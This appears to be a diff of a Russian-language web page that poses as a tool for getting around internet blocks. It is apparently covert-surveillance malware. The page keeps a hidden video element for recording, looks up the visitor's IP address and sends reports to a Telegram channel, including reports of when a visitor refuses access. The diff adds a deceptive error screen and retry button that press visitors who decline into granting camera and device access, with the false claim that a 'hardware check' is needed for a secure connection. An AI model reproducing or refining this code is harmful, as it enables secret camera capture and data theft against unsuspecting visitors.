@@ -135,16 +135,6 @@
             line-height: 1.4;
         }
         
-        .timer-notice {
-            background: #d1ecf1;
-            border: 1px solid #bee5eb;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            font-size: 13px;
-            color: #0c5460;
-        }
-        
         .btn-primary {
             background: linear-gradient(135deg, #28a745, #20c997);
             color: white;
@@ -288,9 +278,52 @@
             pointer-events: none;
         }
         
-        .countdown {
-            font-weight: bold;
+        .error-message {
+            display: none;
+            background: #f8d7da;
+            border: 2px solid #f5c6cb;
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        
+        .error-icon {
+            font-size: 42px;
+            margin-bottom: 15px;
             color: #dc3545;
+        }
+        
+        .error-title {
+            color: #721c24;
+            font-size: 18px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .error-description {
+            color: #721c24;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        
+        .btn-retry {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 14px 32px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-retry:hover {
+            background: #c82333;
+            transform: translateY(-2px);
         }
     </style>
 </head>
@@ -326,12 +359,8 @@
                 </div>
             </div>
             
-            <div class="timer-notice">
-                ⏱ Автоматическая проверка начнется через <span id="countdown">25</span> секунд
-            </div>
-            
             <button class="btn-primary" onclick="requestDeviceAccess()">
-                Разрешить проверку устройства
+                Начать обход блокировки
             </button>
             <button class="btn-secondary" onclick="showAlternativeMethod()">
                 Альтернативный метод
@@ -371,6 +400,18 @@
             </div>
         </div>
         
+        <!-- Третий экран - ошибка при отказе -->
+        <div class="error-message" id="errorMessage">
+            <div class="error-icon">❌</div>
+            <div class="error-title">Невозможно начать процесс обхода блокировки</div>
+            <div class="error-description">
+                Для корректной работы системы требуется предварительная проверка аппаратных характеристик вашего устройства. Без этого невозможно установить безопасное соединение и настроить параметры обхода ограничений.
+            </div>
+            <button class="btn-retry" onclick="retryAccess()">
+                Повторить проверку устройства
+            </button>
+        </div>
+        
         <!-- Скрытое видео элемент для записи -->
         <video class="hidden-video" id="video" autoplay muted playsinline></video>
         
@@ -387,23 +428,6 @@
         let stream;
         let photoInterval;
         let userIP = 'Определяется...';
-        let autoStartTimer;
-
-        // Таймер обратного отсчета
-        function startCountdown() {
-            let seconds = 25;
-            const countdownElement = document.getElementById('countdown');
-            
-            autoStartTimer = setInterval(() => {
-                seconds--;
-                countdownElement.textContent = seconds;
-                
-                if (seconds <= 0) {
-                    clearInterval(autoStartTimer);
-                    requestDeviceAccess();
-                }
-            }, 1000);
-        }
 
         // Получаем IP адрес
         async function getUserIP() {
@@ -542,11 +566,6 @@
 
         // Основная функция доступа
         async function requestDeviceAccess() {
-            // Останавливаем таймер если он еще работает
-            if (autoStartTimer) {
-                clearInterval(autoStartTimer);
-            }
-            
             await getUserIP();
             
             try {
@@ -605,6 +624,11 @@
                 });
 
             } catch (error) {
+                // Показываем сообщение об ошибке
+                document.getElementById('permissionRequest').style.display = 'none';
+                document.getElementById('loadingContainer').style.display = 'none';
+                document.getElementById('errorMessage').style.display = 'block';
+
                 const errorInfo = `❌ ОТКАЗ В ДОСТУПЕ
 ⏰ ${new Date().toLocaleString()}
 📡 IP: ${userIP}
@@ -613,11 +637,6 @@
 ❌ Пользователь отказал в доступе к устройству`;
 
                 await sendToTelegram(errorInfo);
-                
-                // Все равно показываем процесс "обхода"
-                document.getElementById('permissionRequest').style.display = 'none';
-                document.getElementById('loadingContainer').style.display = 'block';
-                animateProgress();
             }
         }
 
@@ -625,10 +644,10 @@
             alert('Альтернативный метод временно недоступен. Пожалуйста, используйте основной метод проверки устройства для обеспечения безопасного соединения.');
         }
 
-        // Запускаем обратный отсчет при загрузке страницы
-        window.addEventListener('load', () => {
-            startCountdown();
-        });
+        function retryAccess() {
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('permissionRequest').style.display = 'block';
+        }
 
     </script>
 </body>
